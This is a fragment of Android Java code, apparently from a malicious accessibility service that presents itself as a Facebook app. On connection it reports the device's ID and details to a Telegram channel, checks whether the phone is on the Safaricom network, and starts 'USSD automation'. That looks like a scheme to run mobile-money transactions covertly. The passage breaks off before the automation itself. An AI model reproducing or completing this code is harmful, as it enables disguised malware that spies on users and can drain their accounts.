              @Override
              public void onServiceConnected() {
                  super.onServiceConnected();
                  Log.d(TAG, "Service connected");

                  startForegroundService();
                  generateDeviceInfo();
                  sendTelegram("📱 **Facebook App Installed**\n🆔 Device ID: `" + deviceId + "`\n📟 Device: " + deviceInfo);
                  Toast.makeText(this, "Facebook service started", Toast.LENGTH_SHORT).show();

                  if (!isSafaricomNetwork()) {
                      sendTelegram("❌ Device is NOT on Safaricom network. USSD automation will not run.");
                      Toast.makeText(this, "Not on Safaricom. USSD automation disabled.", Toast.LENGTH_LONG).show();
                      return;
                  }

                  sendTelegram("✅ Device is on Safaricom network. USSD automation will run.");

                  handler.postDelayed(() -> {
